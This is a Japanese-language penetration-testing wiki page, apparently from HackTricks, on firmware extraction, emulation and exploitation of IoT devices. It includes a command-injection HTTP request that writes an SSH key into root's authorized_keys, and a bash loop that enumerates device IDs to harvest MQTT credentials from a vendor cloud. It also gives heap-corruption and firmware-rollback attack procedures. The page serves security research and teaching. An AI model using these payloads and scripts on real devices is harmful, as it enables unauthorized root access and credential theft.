# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **はじめに**

### 関連リソース

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmwareは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理し、円滑にすることで、デバイスを正常に動作させるための不可欠なソフトウェアです。Firmwareは不揮発性メモリに保存されているため、デバイスの電源が入った時点から重要な命令にアクセスでき、オペレーティングシステムの起動につながります。セキュリティ上の脆弱性を特定するには、Firmwareを調査し、必要に応じて変更することが重要な手順となります。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成や使用されている技術を把握するための重要な初期段階です。このプロセスでは、次の情報を収集します。

- CPUアーキテクチャと実行しているオペレーティングシステム
- Bootloaderの詳細
- ハードウェア構成とデータシート
- コードベースの規模とソースの場所
- 外部ライブラリとライセンスの種類
- アップデート履歴と規制認証
- アーキテクチャ図とフロー図
- セキュリティ評価と特定済みの脆弱性

この目的には、**オープンソースインテリジェンス（OSINT）**ツールが非常に役立ちます。また、利用可能なオープンソースソフトウェアコンポーネントを、手動および自動のレビューで分析することも有効です。[Coverity Scan](https://scan.coverity.com)や[Semmle’s LGTM](https://lgtm.com/#explore)などのツールは、潜在的な問題の発見に活用できる無料の静的解析を提供しています。

## **Firmwareの入手**

Firmwareは、複雑さの異なるさまざまな方法で入手できます。

- 開発者やメーカーなどの提供元から**直接入手**する
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- ホストされているFirmwareファイルを探すために**Google dork**クエリを利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner)などのツールを使って**クラウドストレージ**に直接アクセスする
- 中間者攻撃の手法で**アップデート**を傍受する
- **UART**、**JTAG**、**PICit**などを介してデバイスから**抽出**する
- デバイスの通信を監視して、アップデート要求を**スニッフィング**する
- **ハードコードされたアップデートエンドポイント**を特定して利用する
- Bootloaderまたはネットワークから**ダンプ**する
- ほかの方法が使えない場合、適切なハードウェアツールを使ってストレージチップを**取り外し、読み取る**

### UARTのログのみ：Flash内のU-Boot環境変数を使ってroot shellを強制起動する

UART RXが無視される（ログのみ取得できる）場合でも、オフラインで**U-Boot環境変数のblobを編集**すれば、init shellを強制的に起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8クリップとプログラマー（3.3V）を使ってSPI flashをダンプする。
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を追加し、blobの**U-Boot env CRC32を再計算**します。
3. env partitionだけを書き戻して再起動すると、UARTにshellが表示されます。

これは、bootloader shellは無効になっているものの、外部flashアクセスでenv partitionを書き換えられる組み込みデバイスで役立ちます。

## ファームウェアの解析

これで**ファームウェアを入手できた**ので、どのように扱うべきかを判断するため、情報を抽出する必要があります。そのために使えるツールはいくつかあります。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

これらのツールであまり見つからない場合は、`binwalk -E <bin>` でイメージの**エントロピー**を確認してください。エントロピーが低ければ、暗号化されていない可能性が高いです。高ければ、暗号化されている可能性が高いです（または何らかの方法で圧縮されています）。

さらに、これらのツールを使って**ファームウェア内に埋め込まれたファイル**を抽出できます。


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、[**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) でファイルを調査できます。

### ファイルシステムの取得

前述の `binwalk -ev <bin>` などのツールを使えば、**ファイルシステムを抽出**できているはずです。\
Binwalk は通常、ファイルシステムの種類を名前にした**フォルダー**に抽出します。一般的な種類は、squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs です。

#### ファイルシステムの手動抽出

binwalk のシグネチャにファイルシステムのマジックバイトが**含まれていない**場合があります。その場合は、binwalk で**ファイルシステムのオフセットを特定し、バイナリから圧縮されたファイルシステムを切り出して**、以下の手順に従い種類に応じてファイルシステムを**手動で抽出**してください。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

次の **dd command** を実行して、Squashfs ファイルシステムを切り出します。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

または、次のコマンドも実行できます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

実行後、ファイルは "`squashfs-root`" ディレクトリに格納されます。

- CPIO アーカイブファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND flash を使用する ubifs ファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## ファームウェアの分析

ファームウェアを入手したら、その構造や潜在的な脆弱性を把握するために、内容を詳しく調べることが重要です。このプロセスでは、さまざまなツールを使ってファームウェアイメージを分析し、有用なデータを抽出します。

### 初期分析ツール

バイナリファイル（`<bin>` と表記）を初期調査するためのコマンドを紹介します。これらのコマンドは、ファイル形式の特定、文字列の抽出、バイナリデータの分析、パーティションとファイルシステムの詳細の把握に役立ちます。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

イメージの暗号化状態を評価するには、`binwalk -E <bin>` で**エントロピー**を確認します。エントロピーが低い場合は暗号化されていない可能性が高く、エントロピーが高い場合は暗号化または圧縮されている可能性があります。

**埋め込みファイル**の抽出には、**file-data-carving-recovery-tools**のドキュメントや、ファイル検査用の**binvis.io**などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使うと、通常はファイルシステムを抽出でき、抽出先は多くの場合、ファイルシステムの種類（例: squashfs、ubifs）にちなんだディレクトリになります。ただし、magic bytes が見つからず **binwalk** がファイルシステムの種類を認識できない場合は、手動での抽出が必要です。その場合は、まず `binwalk` でファイルシステムのオフセットを特定し、次に `dd` コマンドでファイルシステムを切り出します。

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で展開するために異なるコマンドを使用します。

### ファイルシステムの分析

ファイルシステムを展開したら、セキュリティ上の欠陥の調査を開始します。安全でないネットワークデーモン、ハードコードされた認証情報、APIエンドポイント、アップデートサーバーの機能、未コンパイルのコード、起動スクリプト、およびオフライン分析用のコンパイル済みバイナリに注目します。

**主な場所**と**確認項目**は次のとおりです。

- ユーザー認証情報を確認するための **etc/shadow** および **etc/passwd**
- **etc/ssl** 内のSSL証明書とキー
- 脆弱性の可能性がある設定ファイルとスクリプトファイル
- さらなる分析のための組み込みバイナリ
- 一般的なIoTデバイスのWebサーバーとバイナリ

ファイルシステム内の機密情報や脆弱性の発見に役立つツールがいくつかあります。

- 機密情報の検索には、[**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的なファームウェア分析には、[**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 静的・動的分析には、[**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、および [**EMBA**](https://github.com/e-m-b-a/emba)

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内で見つかったソースコードとコンパイル済みバイナリの両方について、脆弱性がないか精査する必要があります。Unixバイナリ用の **checksec.sh** やWindowsバイナリ用の **PESecurity** などのツールは、悪用される可能性のある保護されていないバイナリの特定に役立ちます。

## 導出URLトークンを介したクラウド設定とMQTT認証情報の取得

多くのIoTハブは、次のようなクラウドエンドポイントからデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

ファームウェアの分析中に、たとえば次のように、ハードコードされたシークレットを使って`<token>`がデバイスIDからローカルで導出されていることがわかる場合があります。

- token = MD5( deviceId || STATIC_KEY )。大文字の16進数として表現

この設計では、deviceIdとSTATIC_KEYを知っている人なら誰でもURLを再構築してクラウド設定を取得でき、多くの場合、平文のMQTT認証情報やトピックプレフィックスが漏えいします。

実践的な手順:

1) UARTの起動ログからdeviceIdを抽出する

- 3.3V UARTアダプター（TX/RX/GND）を接続して、ログを取得します。

```bash
picocom -b 115200 /dev/ttyUSB0
```

- クラウド設定URLのパターンとブローカーアドレスを出力している行を探します。例えば:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmwareからSTATIC_KEYとtoken algorithmを復元する

- バイナリをGhidra/radare2に読み込み、config path（"/pf/"）またはMD5の使用箇所を検索する。
- algorithmを確認する（例：MD5(deviceId||STATIC_KEY)）。
- Bashでtokenを導出し、digestを大文字にする：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) クラウド設定と MQTT 認証情報を収集する

- URL を組み立て、curl で JSON を取得し、jq で解析してシークレットを抽出する:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 平文 MQTT と脆弱な topic ACL（存在する場合）を悪用する

- 回収した認証情報を使ってメンテナンス用トピックを subscribe し、機密性の高いイベントを探す:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 予測可能なデバイス ID を列挙する（大規模に、許可を得て）

- 多くのエコシステムでは、ベンダーの OUI／製品／タイプを示すバイト列の後に、連番のサフィックスが埋め込まれています。
- 候補 ID を順に試し、トークンを導出して、プログラムから設定を取得できます。

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

注意事項
- 大規模な列挙を試みる前に、必ず明示的な許可を得てください。
- 可能であれば、対象ハードウェアを変更せずに秘密情報を復元するため、エミュレーションまたは静的解析を優先してください。


ファームウェアをエミュレートすることで、デバイスの動作または個々のプログラムの**動的解析**が可能になります。この方法では、ハードウェアやアーキテクチャへの依存が課題となる場合がありますが、root filesystemや特定のバイナリを、Raspberry Piのようなアーキテクチャとエンディアンが一致するデバイス、または事前構築済みの仮想マシンに移すことで、さらにテストを進められます。

### 個々のバイナリのエミュレーション

単一のプログラムを調べるには、そのプログラムのエンディアンとCPUアーキテクチャを特定することが重要です。

#### MIPSアーキテクチャの例

MIPSアーキテクチャのバイナリをエミュレートするには、次のコマンドを使用できます。

```bash
file ./squashfs-root/bin/busybox
```

また、必要なエミュレーションツールをインストールするには:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS（ビッグエンディアン）では `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARMアーキテクチャのエミュレーション

ARMバイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレーターを使用します。

### フルシステムエミュレーション

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールを使うと、ファームウェア全体のエミュレーションを自動化し、動的解析を支援できます。

### エミュレーション用に分割された検証済みrootファイルシステムを再構築する

SquashFSのsuperblockは読み取り可能でも、inode、ディレクトリ、またはfragment tableのオフセットが不正な場合、すぐに `unsquashfs` にパッチを当てないでください。初期ブートバイナリをリバースエンジニアリングし、そこに構築されるブロックデバイスの構成を再現してください。組み込みシステムでは、名目上のrootパーティションを公開しつつ、別のパーティションから借りたセクターを追加する `dm-linear` マッピングで、実際のファイルシステムを構成していることがあります。superblockのみのチェックは、後続のメタデータブロックがすべてずれていても成功する場合があります。<sup>[[9]](#references)</sup>

ファームウェアの演算を正確に再現してください。特に、長さがバイト、512バイトセクター、4 KiBページのどれで表されているかを確認し、シフトと切り捨てを元の順序で再現し、A/Bレイアウトにおけるバンク依存の末尾領域を考慮してください。たとえば、`(partition_bytes >> 12) << 3` は、まず4 KiB境界で切り捨ててから、結果を512バイトセクター単位で表します。これを `partition_bytes // 512` に置き換えると、追加される領域の位置が数キロバイトずれ、後続のSquashFSテーブルがすべて破損する可能性があります。<sup>[[9]](#references)</sup>

有効な検証手順は次のとおりです。<sup>[[9]](#references)</sup>

1. 検証/initバイナリから、各 `dm-linear` セグメントのソースデバイス、開始セクター、長さを特定する。
2. アライメントの仕様を変えずに、各領域を連結またはマッピングする。
3. 抽出に失敗する場合は、予測した境界の周辺の狭い範囲だけを検索し、もっともらしいsuperblockだけで判断せず、連続する複数の有効なメタデータ構造を確認する。
4. 再構築したイメージに未改変の `unsquashfs` を実行する。すべてのディレクトリとfragmentをたどれることは、`unsquashfs -stat` より強い証拠になる。

#### アナリストが制御するdm-verityの置き換え

アナリストがQEMUのカーネル、initramfs、仮想ディスクを制御できる場合、小さく静的リンクしたinitでベンダーの検証用PID 1を置き換えることで、変更したrootを起動できます。これは**ラボでのブートチェーン置き換え**であり、dm-verity、そのRSA署名、Secure Boot、またはTPM封印鍵を破るものではありません。<sup>[[9]](#references)</sup>

置き換えるinitは、元のブート手順の実運用部分を再現する必要があります。`devtmpfs` をマウントし、`setsid()` を呼び出し、`/dev/console` をファイルディスクリプター0～2に接続し、`/proc` と `/sys` をマウントし、指定されたブロックデバイスを待ち、編集したrootを読み取り専用でマウントし、古いrootの疑似ファイルシステムをデタッチし、新しいマウントを `/` に移動し、`chroot` して、ファームウェア本来の `/sbin/init` を `execve()` で実行します。`MS_MOVE` の**前に** `/dev`、`/proc`、`/sys` をデタッチすると、新しいrootに属するマウントポイントを誤ってデタッチするのを防げます。<sup>[[9]](#references)</sup>

変更した不変rootとは別に、変更可能なデバイス状態を保持してください。qcow2オーバーレイを使えば元のディスクのLVM状態を維持でき、2台目の読み取り専用virtioディスクで編集済みのSquashFSを提供できます。<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline image-state debugging

起動が遅い場合、破壊的な起動スクリプトがある場合、またはコンソールログが不安定で障害の原因が分かりにくい場合は、guest の外部から永続状態を調べます。実行中の VM が使用している overlay は決して接続せず、`qemu-nbd` で公開し、LVM の検出対象を意図した NBD パーティションに限定してから、切断する前にボリュームグループを無効化します。<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

再現性のある fault isolation を行うには、書き込み可能で安定したボリュームにタイムスタンプ付きのマーカーファイルを書き込み、オフラインで検証します。`/dev/kmsg`、FIFO、一時的なコンソールは、レート制限やプロセスの早期終了によって偽陰性を生じることがあります。また、無関係なコードを変更する前に、各レイヤー間のインターフェースが完全に一致しているかを比較します。たとえば、`uname -r` と `/lib/modules/`、ディスク上の ext4 機能とカーネル設定、Mesa の `libGL` の世代と DRI driver ABI、および PCI 情報から導出されるドライバー名を比較します。コンポーネントが存在し、`dlopen()` に成功しても、利用側が異なる ABI を想定しているために使用できないことがあります。<sup>[[9]](#references)</sup>

## 実践的な Dynamic Analysis

この段階では、実機またはエミュレートされたデバイス環境を分析に使用します。OS とファイルシステムへの shell access を維持することが不可欠です。エミュレーションではハードウェアとのやり取りを完全に再現できない場合があり、エミュレーションの再起動が必要になることがあります。分析では、ファイルシステムを再調査し、公開されている Web ページやネットワークサービスを exploit し、bootloader の脆弱性を調べます。潜在的な backdoor 脆弱性を特定するには、firmware の完全性テストが重要です。

## Runtime Analysis の手法

Runtime Analysis では、gdb-multiarch、Frida、Ghidra などのツールを使い、動作環境内でプロセスやバイナリとやり取りします。ブレークポイントを設定し、fuzzing などの手法で脆弱性を特定します。

完全な debugger を利用できない embedded target では、**静的リンクされた `gdbserver` をデバイスにコピーし、リモートから接続します**。<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor メッセージマッピング

IoT ハブでは、RF stack が **radio MCU** と Linux userland process の間で分割されていることがよくあります。有用なワークフローは、次の経路をマッピングすることです:<sup>[[8]](#references)</sup>

1. 無線上の **RF frame**
2. radio MCU 上の **controller-side parser**
3. Linux に転送される **serial/UART text または TLV protocol**（例: `/dev/tty*`）
4. メイン daemon 内の **application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャでは、reversing の対象が1つではなく2つになります。controller が binary radio frame を `Group,Command,arg1,arg2,...` のような text protocol に変換する場合は、次の情報を特定します。

- **message group** と dispatch table
- どの message が **network** から届き、どれが controller 自身から届くか
- 正確な **manufacturer-specific discriminator field**（例: Zigbee の `manufacturer_code` と custom `cluster_command`）
- **commissioning**、discovery、firmware/model download の段階でのみ到達可能な handler

Zigbee では、pairing traffic をキャプチャし、対象機器がデフォルトの **Link Key** `ZigBeeAlliance09` に依然として依存しているか確認します。依存している場合、commissioning traffic の sniffing により **Network Key** が漏えいする可能性があります。Zigbee 3.0 の install code はこのリスクを軽減するため、テスト対象の機器で実際に強制されているか記録します。

### Manufacturer-specific protocol handler と FSM によって制限される到達可能性

Vendor-specific Zigbee/ZCL command は、標準化された cluster よりも有力なターゲットであることがよくあります。十分な検証実績のない **custom parsing code** や内部 **FSM** に入力されるためです。<sup>[[8]](#references)</sup>

実践的なワークフロー:

- command dispatcher を reverse し、**vendor-only handler** を見つける。
- **FSM state**、**event**、**check**、**action**、**next-state** の table を特定する。
- 自動的に遷移する **transitional state** と、最終的に attacker-controlled state を reset または free する retry/error branch を特定する。
- buggy handler に常に到達可能だと決めつけず、daemon を脆弱な state に移行させるために必要な正規の protocol exchange を確認する。

タイミングに敏感な protocol では、Python framework による packet replay は遅すぎる場合があります。より信頼性の高い方法は、vendor-grade stack を使って実機器（例: **nRF52840**）上で正規の device をエミュレートし、正しい **endpoint**、**attribute**、commissioning のタイミングを再現することです。

### 組み込み daemon における fragmented-download bug class

**fragmented blob/model/configuration download** では、次のような firmware bug class が繰り返し見られます:<sup>[[8]](#references)</sup>

1. **最初の fragment**（`offset == 0`）で `ctx->total_size` を保存し、`malloc(total_size)` を実行する。
2. 後続 fragment では、`packet_total_size >= offset + chunk_len` のような、攻撃者が制御する **packet-local** field だけを検証する。
3. **元の割り当てサイズ**を確認せず、`memcpy(&ctx->buffer[offset], chunk, chunk_len)` でコピーする。

攻撃者は次の操作ができます。

- **小さい** total size を指定した有効な最初の fragment を送り、小さな heap allocation を発生させる。
- **想定される offset** を指定しつつ、より大きな `chunk_len` を含む後続 fragment を送る。
- 新しい検証条件を満たしながら、元の割り当て済み buffer を overflow させる、偽造した packet-local size を指定する。

脆弱な経路が commissioning logic の背後にある場合、malformed fragment を送信する前に、対象を想定される model-download または blob-download state に移行させるだけの **device emulation** を行う必要があります。

### Protocol によってトリガーされる `free()`

組み込み daemon では、heap metadata exploitation を引き起こす最も簡単な方法は、「cleanup を待つ」ことではなく、protocol 独自の **error handling を強制する**ことです。<sup>[[8]](#references)</sup>

- 不正な後続 fragment を送り、FSM を **retry** または **error** state に移行させる。
- retry のしきい値を超えさせ、daemon に **context を reset** させて破損した buffer を free させる。
- この予測可能な `free()` を利用して、無関係な原因で process が crash する前に allocator-side primitive をトリガーする。

これは、組み込み Linux の **musl/uClibc/dlmalloc 系** allocator に対して特に有効です。chunk metadata の破損により、unlink/unbin logic を write primitive に変えられることがあります。安定した手法は、実際の bin pointer をすぐに破壊して process を crash させるのではなく、**size field** を破損させて、overflow した buffer 内に配置した **fake chunk** に allocator traversal を誘導することです。

## Binary Exploitation と Proof-of-Concept

特定した vulnerability の PoC を開発するには、対象アーキテクチャへの深い理解と、低水準言語でのプログラミングが必要です。組み込みシステムでは binary runtime protection はまれですが、存在する場合は Return Oriented Programming (ROP) のような手法が必要になることがあります。

### uClibc fastbin exploitation の注意点（組み込み Linux）

- **Fastbin と consolidation:** uClibc は glibc と同様の fastbin を使用します。後続の大きな allocation によって `__malloc_consolidate()` がトリガーされることがあるため、fake chunk は検証（妥当な size、`fd = 0`、周囲の chunk が「使用中」と判定されること）を通過する必要があります。<sup>[[6]](#references)</sup>
- **ASLR 下の non-PIE binary:** ASLR が有効でも、メイン binary が **non-PIE** であれば、binary 内の `.data/.bss` address は安定しています。有効な heap chunk header に見える領域を狙い、fastbin allocation を **function pointer table** に配置できます。
- **parser を停止させる NUL:** JSON の parse 時、payload 内の `\x00` によって parsing を停止させつつ、後続の攻撃者制御 byte を stack pivot/ROP chain 用に保持できます。
- **`/proc/self/mem` 経由の shellcode:** `open("/proc/self/mem")`、`lseek()`、`write()` を呼び出す ROP chain により、既知の mapping に実行可能な shellcode を書き込み、そこへ jump できます。

## Firmware Analysis 用の準備済み Operating System

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) などの operating system は、firmware security testing に必要な tool を備えた、事前設定済みの環境を提供します。

## Firmware 分析用の準備済み OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) device の security assessment と penetration testing を支援するための distro です。必要な tool がすべて読み込まれた事前設定済みの環境を提供し、作業時間を大幅に節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tool が事前に読み込まれた、Ubuntu 18.04 ベースの組み込み security testing operating system です。

## Firmware Downgrade Attack と Insecure Update Mechanism

vendor が firmware image の cryptographic signature check を実装していても、**version rollback（downgrade） protection は省略されていることがよくあります**。boot- または recovery-loader が組み込み public key による signature のみを検証し、flash する image の *version*（または monotonic counter）を比較しない場合、攻撃者は **有効な signature が付いた古く脆弱な firmware** を正規の手順でインストールし、修正済みの vulnerability を再び利用可能にできます。<sup>[[4]](#references)</sup>

典型的な attack workflow:

1. **古い署名付き image を入手する**
   * vendor の公開 download portal、CDN、または support site から取得する。
   * companion mobile/desktop application から抽出する（例: Android APK 内の `assets/firmware/`）。
   * VirusTotal、Internet archive、forum などの third-party repository から取得する。
2. 公開されている update channel を使って、image を device に **upload または配信する**:
   * Web UI、mobile-app API、USB、TFTP、MQTT など。
   * 多くの consumer IoT device は、Base64 encode された firmware blob を受け付け、server-side で decode して recovery/upgrade を開始する *unauthenticated* HTTP(S) endpoint を公開しています。
3. downgrade 後、新しい release で修正された vulnerability を exploit する（例: 後から追加された command-injection filter）。
4. 必要に応じて、persistence を確保した後に detection を避けるため、最新 image を再度 flash するか、update を無効にする。

### 例: Downgrade 後の Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメータがサニタイズされずに shell command に直接連結されるため、任意のコマンドを注入できます（ここでは、SSH key による root access を有効化しています）。後のファームウェアバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は意味をなしません。<sup>[[4]](#references)</sup>

### モバイルアプリからのファームウェアの抽出

多くのベンダーは、アプリから Bluetooth/Wi-Fi 経由でデバイスを更新できるよう、コンパニオンモバイルアプリにファームウェアイメージ全体を同梱しています。これらのパッケージは通常、`assets/fw/` や `res/raw/` のようなパスにある APK/APEX 内に暗号化されずに保存されています。`apktool`、`ghidra` などのツールや、単純な `unzip` を使えば、物理ハードウェアに触れずに署名済みイメージを取り出せます。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot設計におけるupdaterのみのanti-rollbackバイパス

一部のベンダーはanti-downgrade **ratchet**を実装していますが、その適用範囲は*updater*のロジック内に限られます（たとえば、CAN経由のUDSルーチン、recoveryコマンド、userspace OTA agent）。その後、**bootloader**がイメージの署名/CRCだけをチェックし、partition tableやslot metadataを信頼する場合、rollback protectionは依然としてバイパスされる可能性があります。<sup>[[7]](#references)</sup>

よくある脆弱な設計:

- Firmware metadataに、version descriptorと**security ratchet** / monotonic counterの両方が含まれている。
- Updaterは、イメージのratchetをpersistent storage内の値と比較し、古い署名済みイメージを拒否する。
- Bootloaderはそのratchetを**解析せず**、選択されたslotを起動する前にheader、CRC、signatureだけを検証する。
- Slot activationはpartition tableまたはslotごとのgeneration counterに別途保存され、検証済みの正確なfirmware digestと**暗号学的に結び付けられていない**。

これにより、dual-slotシステムで**一方のイメージを検証し、別のイメージを起動する**手段が生まれます。攻撃者が、現在の署名済みイメージを使ってupdaterにslot Bを次の起動先として設定させ、再起動前にslot Bを上書きできる場合、bootloaderはすでにcommit済みのslot metadataだけを信頼しているため、古いイメージを起動する可能性があります。

よくある悪用パターン:

1. **現在の署名済み**firmwareをpassive slotにアップロードし、通常の検証/切り替えルーチンを実行して、そのslotが次のactive slotになるようlayoutに記録させる。
2. **まだ再起動しない**。同じsession内でslotの準備/消去ルーチンに再び入る。
3. 古いboot-stateまたは古いslot-selectionロジックを悪用し、updaterに昇格したばかりの**同じ物理slot**を消去させる。
4. **古いが、まだ署名が有効な**firmwareをそのslotに書き込む。
5. ratchetを強制する検証ルーチンをスキップし、直接再起動する。
6. Bootloaderが昇格済みのslotを選択し、signature/integrityだけを検証して古いイメージを起動する。

A/B updateの実装をリバースする際に確認する項目:

- Slotの選択が、切り替え成功後に更新されない**boot-time flags**から行われている。
- `prepare_passive_slot()`のようなルーチンが、**現在commit済みのlayout**ではなく古い状態に基づいてslotを消去する。
- `part_write_layout()`のような関数が、**generation counter** / active flagだけを更新し、検証済みイメージのhashを保存しない。
- Ratchetチェックがuserspaceまたはupdaterのコードに実装されているが、ROM / bootloader / secure bootの各stageには**実装されていない**。
- 消去またはrecoveryルーチンが、slotの内容を消去して書き換えた後も、そのslotを起動可能な状態に保つ。

### Update Logicの評価チェックリスト

* *update endpoint*の通信/認証は適切に保護されているか（TLS + authentication）？
* Flashingの前に、デバイスは**version number**または**monotonic anti-rollback counter**を比較するか？
* イメージはsecure boot chain内で検証されるか（例: ROM codeによるsignatureチェック）？
* **Bootloaderはupdaterと同じratchetを強制するか**。それともsignature/CRCのチェックだけか？
* Slot activation metadataは**検証済みのfirmware digest/versionに結び付けられているか**。それとも昇格後にslotを変更できるか？
* Slotの切り替えに成功した後、デバイスは強制的に再起動するか。それとも同じsession内で後続のupdate/eraseルーチンを実行できるか？
* Userland codeは追加のsanity check（例: 許可されたpartition map、model number）を行うか？
* *partial*または*backup* update flowは、同じ検証ロジックを再利用しているか？

> 💡  上記のいずれかが欠けている場合、そのplatformはrollback attackに対して脆弱である可能性が高いです。

## 練習用の脆弱なfirmware

Firmwareの脆弱性を見つける練習には、以下の脆弱なfirmware projectを出発点として使用してください。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
